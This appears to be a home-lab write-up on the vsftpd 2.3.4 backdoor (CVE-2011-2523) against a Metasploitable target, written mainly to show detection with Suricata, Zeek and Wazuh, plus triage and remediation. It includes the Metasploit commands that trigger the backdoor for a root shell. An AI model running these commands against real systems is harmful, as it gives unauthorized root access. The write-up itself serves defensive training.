# 04 — vsftpd 2.3.4 Backdoor (RCE)

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · **CVE-2011-2523**
**Attacker:** Kali · **Target:** Metasploitable FTP `10.0.40.222:21` · **Detection:** Security Onion + Wazuh

A famous supply-chain backdoor: a tainted vsftpd 2.3.4 release opens a root shell on port 6200 when a username containing `:)` is submitted. It's a clean demonstration of exploitation → unauthorized shell, and the network sensor catches it.

---

## 1. The attack

Using the public Metasploit module against the training target:
```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.40.222
run
```
On success you get a root command shell via the backdoor port.

![vsftpd exploit shell](./01-vsftpd-exploit.png)
> 📸 *Capture: Metasploit reporting the backdoor triggered and the resulting `id` = root shell.*

---

## 2. Detection

**Security Onion (Suricata)** — ET signatures exist for the vsftpd 2.3.4 backdoor trigger and the resulting connection to the backdoor port. In SO **Alerts**, filter to the Kali source / vuln-host destination. **Hunt** (Zeek `conn.log`) shows the anomalous follow-on connection to the high backdoor port immediately after the FTP interaction.

![Suricata vsftpd alert](./02-securityonion-vsftpd-alert.png)
> 📸 *Capture: the SO Suricata alert for the vsftpd backdoor + the backdoor-port connection in Hunt.*

**Wazuh** — the FTP daemon and auth logs from the target (vuln-host agent) record the anomalous session; command execution as root post-exploit is visible if the shell runs anything logged.

![Wazuh FTP/host event](./03-wazuh-host-event.png)
> 📸 *Capture: Wazuh event(s) from the vuln-host agent around the exploit time.*

---

## 3. Triage

This is a confirmed **compromise**, not an attempt — a root shell was obtained. Scope it: source IP, exact time, and any post-exploitation commands. In a real incident this host would be isolated immediately. Open a TheHive case and treat the target as compromised.

---

## 4. Mitigation & remediation

- **Patch / upgrade** — the real fix is not running a backdoored legacy daemon; upgrade vsftpd.
- **Remove unnecessary services** — FTP rarely needs to be internet- or even broadly-reachable.
- **Egress / east-west filtering** — block unexpected high-port callbacks (the backdoor port).
- **File integrity & package verification** to catch tampered binaries (Wazuh FIM).
- **Isolate and rebuild** any host confirmed shelled.

---

## 5. Detection engineering

- Suricata: ensure the ET ruleset is current so the backdoor sig is present; add an alert for connections to uncommon high ports right after an FTP session (Zeek correlation).
- Wazuh FIM on service binaries to flag tampered packages.

---

## Screenshots checklist
- [ ] `01-vsftpd-exploit.png` — Metasploit root shell
- [ ] `02-securityonion-vsftpd-alert.png` — Suricata alert + backdoor-port connection
- [ ] `03-wazuh-host-event.png` — Wazuh host-side events
